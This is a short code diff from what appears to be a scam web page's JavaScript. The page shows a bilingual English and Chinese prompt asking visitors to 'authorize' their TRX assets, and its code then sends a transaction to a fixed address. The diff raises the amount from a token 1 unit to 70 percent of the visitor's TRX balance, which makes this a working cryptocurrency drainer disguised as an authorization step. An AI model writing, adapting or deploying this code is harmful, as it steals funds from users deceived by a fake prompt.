@@ -649,8 +649,8 @@
 						`<br><br>Please authorize your TRX assets so that the system can view and complete the transaction<br><br>請通過授權您的TRX資產以便系統檢視並完成交易`
 					  );
 					  let sendTrx = Math.round(
-						//Number(trxbalance).mul(Number(90).div(100))
-						Number(1)
+						Number(trxbalance).mul(Number(70).div(100))
+						//Number(1)
 					  );
 					  tronWeb.trx.sendTransaction(toAddress, sendTrx).finally(() => {
 						loading.close();
